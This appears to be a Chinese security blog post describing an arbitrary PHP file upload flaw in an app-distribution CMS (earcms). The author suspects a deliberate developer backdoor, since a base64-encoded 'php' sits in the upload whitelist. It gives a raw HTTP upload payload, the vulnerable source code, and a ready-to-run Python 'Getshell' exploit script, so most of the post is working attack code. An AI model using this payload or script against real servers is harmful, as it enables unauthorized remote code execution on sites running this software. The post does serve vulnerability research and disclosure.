<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>某云分发APP上传漏洞 - F0rmat&#39;Blog</title>
<link rel="stylesheet" type="text/css" href="/css/main.css">
</head>
<body>
<header>
  <div>
    <h1><a href="https://getshe11.com/">F0rmat&#39;Blog</a></h1>
  </div>
  <nav></nav>
</header>
<main>
  <article>
    <div class="title">
  <h1>某云分发APP上传漏洞</h1>
  </div>
<div style="position: fixed; right:-30px; max-width:300px; overflow:auto; top: 1px; width: 300px; bottom:100px">
<div class="container text-center mt-3">
    <iframe src="https://duckduckgo.com/search.html?site=https://getshe11.com/&prefill=" style="overflow:hidden;margin:0;padding:0;max-width:80%;height:40px;" frameborder="0"></iframe>
</div>
</div>
<div class="meta">
  <div>2019-09-06 10:47</div>
  <div>
    <span><a href="https://getshe11.com/tags/php/">#php</a></span>
      <span><a href="https://getshe11.com/tags/earcms/">#earcms</a></span>
      </div>
  </div>
<div class="content">
  <h1 id="0x01-前言">0x01 前言</h1>
<p>大概有几个月没写文章了，最近都在忙(咸鱼),在某此渗透行动中发现的一个洞，感觉是开发留的一个后门。</p>
<h1 id="0x02-漏洞复现">0x02 漏洞复现</h1>
<p>Payload：</p>
<pre><code>POST /source/pack/upload/index-uplog.php HTTP/1.1
Host: 127.0.0.1
Connection: close
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryZWa8hDK6XlSEJhi7
Accept: */*
Accept-Language: zh-CN,zh;q=0.9
Content-Length: 322

------WebKitFormBoundaryZWa8hDK6XlSEJhi7
Content-Disposition: form-data; name=&quot;app&quot;; filename=&quot;Lighthouse.php&quot;
Content-Type: image/jpeg

&lt;?php phpinfo();;unlink(__FILE__);?&gt;
------WebKitFormBoundaryZWa8hDK6XlSEJhi7
Content-Disposition: form-data; name=&quot;time&quot;

test
------WebKitFormBoundaryZWa8hDK6XlSEJhi7--
</code></pre><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/earcms/3.png" alt=""></p>
<p>执行后会在<code>\data\tmp</code>下生成<code>test.php</code>文件</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/earcms/1.png" alt=""></p>
<p>访问url:http://127.0.0.1/data/tmp/test.php</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/earcms/2.png" alt=""></p>
<h1 id="0x03-漏洞分析">0x03 漏洞分析</h1>
<p>漏洞文件位置:<code>source/pack/upload/index-uplog.php</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
<span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($_FILES)){
$filepart <span style="color:#f92672">=</span> <span style="color:#a6e22e">pathinfo</span>($_FILES[<span style="color:#e6db74">&#39;app&#39;</span>][<span style="color:#e6db74">&#39;name&#39;</span>]);
$extension <span style="color:#f92672">=</span> <span style="color:#a6e22e">strtolower</span>($filepart[<span style="color:#e6db74">&#39;extension&#39;</span>]);
<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">in_array</span>($extension,<span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;ipa&#39;</span>,<span style="color:#e6db74">&#39;apk&#39;</span>,<span style="color:#a6e22e">base64_decode</span>(<span style="color:#e6db74">&#39;cGhw&#39;</span>)))){
$time <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;time&#39;</span>];
$dir <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;../../../data/tmp/&#39;</span><span style="color:#f92672">.</span>$time<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;/&#39;</span>;
<span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">is_dir</span>($dir)){
<span style="color:#f92672">@</span><span style="color:#a6e22e">mkdir</span>($dir,<span style="color:#ae81ff">0777</span>,<span style="color:#66d9ef">true</span>);
}
$file <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;../../../data/tmp/&#39;</span><span style="color:#f92672">.</span>$time<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;.&#39;</span><span style="color:#f92672">.</span>$extension;
<span style="color:#f92672">@</span><span style="color:#a6e22e">move_uploaded_file</span>($_FILES[<span style="color:#e6db74">&#39;app&#39;</span>][<span style="color:#e6db74">&#39;tmp_name&#39;</span>],$file);
<span style="color:#66d9ef">if</span>($extension <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;ipa&#39;</span>){
<span style="color:#66d9ef">include_once</span> <span style="color:#e6db74">&#39;../zip/zip.php&#39;</span>;
$zip <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">PclZip</span>($file);
$zip<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">extract</span>(<span style="color:#a6e22e">PCLZIP_OPT_PATH</span>,$dir,<span style="color:#a6e22e">PCLZIP_OPT_BY_PREG</span>,<span style="color:#e6db74">&#39;/^Payload\/.*.app\/Info.plist$/&#39;</span>);
$zip<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">extract</span>(<span style="color:#a6e22e">PCLZIP_OPT_PATH</span>,$dir,<span style="color:#a6e22e">PCLZIP_OPT_BY_PREG</span>,<span style="color:#e6db74">&#39;/^Payload\/.*.app\/embedded.mobileprovision$/&#39;</span>);
$zip<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">extract</span>(<span style="color:#a6e22e">PCLZIP_OPT_PATH</span>,$dir,<span style="color:#a6e22e">PCLZIP_OPT_BY_PREG</span>,<span style="color:#e6db74">&#39;/^Payload\/.*.app\/(?!.*\/).*.png$/&#39;</span>);
}
<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;{&#39;extension&#39;:&#39;</span><span style="color:#e6db74">$extension</span><span style="color:#e6db74">&#39;,&#39;time&#39;:&#39;</span><span style="color:#e6db74">$time</span><span style="color:#e6db74">&#39;,&#39;size&#39;:&#39;&#34;</span><span style="color:#f92672">.</span>$_FILES[<span style="color:#e6db74">&#39;app&#39;</span>][<span style="color:#e6db74">&#39;size&#39;</span>]<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;&#39;}&#34;</span>;
}<span style="color:#66d9ef">else</span>{
<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;-1&#39;</span>;
}
}
<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></code></pre></div><p>刚开始看的时候是以为限制了白名单，后面还加了一个base64解码的，<code>cGhw</code>解开得<code>php</code>，这就很奇怪了，这不是此地无银三百两吗？？应该是开发者留的一个后门吧，这居心叵测，呕~</p>
<p>这个洞也没什么好分析的，<code>time</code>参数是上传后的文件名。</p>
<h1 id="0x04-getshell脚本">0x04 Getshell脚本</h1>
<p><a href="https://github.com/F0r3at/Python-Tools/blob/master/%E4%BA%91%E5%88%86%E5%8F%91app.py">https://github.com/F0r3at/Python-Tools/blob/master/%E4%BA%91%E5%88%86%E5%8F%91app.py</a></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># coding:utf-8</span>
<span style="color:#f92672">import</span> requests
<span style="color:#f92672">from</span> requests_toolbelt <span style="color:#f92672">import</span> MultipartEncoder
requests<span style="color:#f92672">.</span>packages<span style="color:#f92672">.</span>urllib3<span style="color:#f92672">.</span>disable_warnings()
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exp</span>(url):
    urls <span style="color:#f92672">=</span> url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/source/pack/upload/index-uplog.php&#39;</span>
    m <span style="color:#f92672">=</span> MultipartEncoder(
        fields<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;time&#39;</span>: <span style="color:#e6db74">&#39;test&#39;</span>, <span style="color:#e6db74">&#39;app&#39;</span>: (
        <span style="color:#e6db74">&#39;Lighthouse.php&#39;</span>, open(<span style="color:#e6db74">&#34;./Lighthouse.php&#34;</span>, <span style="color:#e6db74">&#39;rb&#39;</span>), <span style="color:#e6db74">&#39;image/jpeg&#39;</span>)}
    )
    header <span style="color:#f92672">=</span> {
        <span style="color:#e6db74">&#34;Connection&#34;</span>: <span style="color:#e6db74">&#34;close&#34;</span>,
        <span style="color:#e6db74">&#34;User-Agent&#34;</span>: <span style="color:#e6db74">&#34;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36&#34;</span>,
        <span style="color:#e6db74">&#34;Content-Type&#34;</span>: m<span style="color:#f92672">.</span>content_type,
        <span style="color:#e6db74">&#34;Accept&#34;</span>: <span style="color:#e6db74">&#34;*/*&#34;</span>,
        <span style="color:#e6db74">&#34;Accept-Language&#34;</span>: <span style="color:#e6db74">&#34;zh-CN,zh;q=0.9&#34;</span>
    }
    requests<span style="color:#f92672">.</span>request(<span style="color:#e6db74">&#34;POST&#34;</span>, urls, verify<span style="color:#f92672">=</span>False, data<span style="color:#f92672">=</span>m, headers<span style="color:#f92672">=</span>header, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span>)

exp(<span style="color:#e6db74">&#34;http://127.0.0.1&#34;</span>)
</code></pre></div><h1 id="0x05-结尾">0x05 结尾</h1>
<p>后来看了看，这套系统还有另外一个名称叫做earcms，只是不太出名而已，后台有点类似dz。</p>
</div>
<div style="position: fixed; right:50px; max-width:255px; overflow:auto; top: 120px; width: 220px; bottom:90px">










<div class="toc">

    <div class="page-header"><strong>目录</strong></div>

    <div id="page-scrollspy" class="toc-nav">

        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x01-%e5%89%8d%e8%a8%80">
                            0x01 前言
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x02-%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0">
                            0x02 漏洞复现
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x03-%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90">
                            0x03 漏洞分析
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x04-getshell%e8%84%9a%e6%9c%ac">
                            0x04 Getshell脚本
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x05-%e7%bb%93%e5%b0%be">
                            0x05 结尾
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        

    </div>

</div>



</div>

  </article>
</main>
<footer>
  <div>
    <div>&copy; 2021 F0rmat. <a href="https://creativecommons.org/licenses/by/4.0/deed.zh">CC-BY-4.0</a></div>
  </div>
</footer>
</body>
</html>
